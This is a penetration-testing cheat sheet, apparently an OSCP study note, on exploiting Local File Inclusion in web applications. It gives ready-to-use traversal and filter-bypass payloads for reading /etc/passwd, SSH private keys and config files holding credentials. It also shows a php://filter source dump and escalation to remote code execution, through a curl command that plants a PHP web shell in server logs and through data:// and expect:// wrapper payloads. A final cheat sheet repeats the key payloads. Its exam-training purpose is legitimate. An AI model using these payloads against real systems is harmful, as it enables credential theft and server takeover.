# 💥 Local File Inclusion (LFI)

> A parameter controls a **file path the server reads/includes** (`?page=`, `?file=`, `?lang=`, `?template=`). You can read arbitrary local files (configs, `/etc/passwd`, SSH keys, source) and — via **log poisoning**, **PHP wrappers**, or **session files** — escalate LFI to **RCE**.

Related: [[Web Exploitation]] · [[HTTP]] · [[RFI]] · [[Shells]] · [[Credential Attacks]] · [[Linux Privilege Escalation]]

---

## 🧠 A FILE/PAGE PARAM → THINK
- **Read first:** `../../../../etc/passwd` (Linux) / `..\..\windows\win.ini` (Windows).
- **PHP app?** → `php://filter` to grab **source code** (finds creds & more LFI).
- **Escalate to RCE:** log poisoning, `/proc/self/environ`, PHP session files, `data://`/`expect://` wrappers, or [[RFI]] if remote URLs work.
- **Read the app's own config** → DB creds → [[Credential Attacks]].

## ⚡ QUICK TRIAGE
```
http://$IP/index.php?page=../../../../../../etc/passwd
```
```
http://$IP/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd        (URL-encoded)
```
```
http://$IP/index.php?page=/etc/passwd                            (absolute, no traversal filter)
```
**Look for:** `/etc/passwd` contents = LFI confirmed. Windows: `C:\Windows\win.ini`.

## 📂 HIGH-VALUE FILES TO READ
| Target | Why |
|---|---|
| `/etc/passwd` | users to target; confirm LFI |
| `/home/<user>/.ssh/id_rsa` | SSH key → direct login ([[SSH|02 - Services/SSH]]) |
| `/var/www/html/config.php`, `.env`, `wp-config.php` | DB/app creds |
| `/etc/apache2/`, `/etc/nginx/` configs | webroot, vhosts, log paths |
| `/proc/self/environ`, `/proc/self/cmdline` | env vars, sometimes poisonable |
| `/var/log/apache2/access.log` | log poisoning target |
| Windows: `win.ini`, `\inetpub\...\web.config`, `unattend.xml` | confirm + creds |

## 🧗 FILTER BYPASS TABLE
| Filter | Bypass |
|---|---|
| Strips `../` once | `....//....//` (nested) |
| URL decoding | `%2e%2e%2f`, double-encode `%252e%252e%252f` |
| Appends `.php` | `php://filter` (works despite suffix); older PHP null byte `%00` |
| Requires prefix dir | traverse out of it: `dir/../../../../etc/passwd` |
| Absolute path blocked | use traversal; or `php://filter/.../resource=` |

## 🔎 SOURCE DISCLOSURE (PHP filter)
Read PHP source as base64 (won't execute, reveals creds & logic):
```
http://$IP/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
Decode the base64 → hunt DB creds, secret keys, more includes.

## 💥 LFI → RCE PATHS
**1) Log poisoning (Apache access/error log):**
```bash
# Inject PHP via the User-Agent (nc keeps the malformed request simple):
curl -A "<?php system(\$_GET['c']); ?>" http://$IP/
```
```
# Then include the log and run commands:
http://$IP/index.php?page=/var/log/apache2/access.log&c=id
```
**2) PHP wrappers (if allowed):**
```
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id     # data:// -> <?php system($_GET['c']);?>
page=expect://id                                                             # expect:// (if extension loaded)
```
**3) PHP session file** (`/var/sessions/sess_<PHPSESSID>` or `/tmp/`): inject PHP into a stored session value, then include the session file.
**4) `/proc/self/environ`**: poison via User-Agent, include environ (older configs).
**5) SSH/mail log poisoning**: log an attempted username containing PHP, then include `/var/log/auth.log` or `/var/mail/<user>`.

Then upgrade to a reverse shell ([[Shells]]).

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `/etc/passwd` reads | LFI confirmed | read keys/configs | creds/keys |
| `id_rsa` readable | SSH key | `ssh -i` → [[SSH|02 - Services/SSH]] | shell |
| Config with DB creds | Cred leak | reuse ([[Credential Attacks]]) | access |
| PHP source via filter | Logic/creds | find more bugs/creds | escalation |
| Log file readable | Poisonable | inject PHP via UA → include | RCE |
| `http://` also includes | It's RFI | host payload → [[RFI]] | RCE |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `../` stripped | `....//`, encoding, double-encoding |
| `.php` appended | `php://filter`; null byte only on old PHP |
| Only same-dir files | Traverse out with enough `../`; try absolute path |
| Can read but no RCE | Grab SSH key/creds instead; try session/log poisoning |
| Log path unknown | Read server config first to find log location |
| Windows target | Read `web.config`/`unattend.xml`; RCE paths differ (no Apache logs) |

## 🧹 POST-EXPLOITATION
Read every config/key → reuse ([[Credential Attacks]], [[SSH|02 - Services/SSH]]); on RCE, reverse shell → [[Linux Privilege Escalation]].

## ⚠️ COMMON MISTAKES
- Reading `/etc/passwd` and stopping — **go for SSH keys and app configs**.
- Forgetting **`php://filter`** to dump source (huge for finding creds & more bugs).
- Not attempting **log poisoning** when a log is readable.
- Ignoring **Windows** targets (different files/paths).

## 🧭 OSCP EXAM MINDSET
LFI is a file-read primitive that often upgrades to a shell. First prove it (`/etc/passwd`), then think like a looter: SSH keys, app config, source via `php://filter`. If you need code exec, poison a log or a PHP session and include it. Every credential you read gets tested everywhere.

## ✅ DON'T MISS
- [ ] `/etc/passwd` (confirm) + Windows `win.ini`
- [ ] SSH keys + app configs (`.env`, `config.php`, `wp-config.php`)
- [ ] `php://filter` source disclosure
- [ ] Traversal + encoding bypasses
- [ ] Log/session poisoning for RCE
- [ ] Reuse every credential found

## 📇 CHEAT SHEET
```
?page=../../../../../../etc/passwd
```
```
?page=php://filter/convert.base64-encode/resource=config.php
```
```bash
curl -A "<?php system(\$_GET['c']); ?>" http://$IP/         # poison log
```
```
?page=/var/log/apache2/access.log&c=id                      # include poisoned log -> RCE
```
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
```
**Kill shots:** LFI → SSH key/creds → shell · log/session poison → RCE.
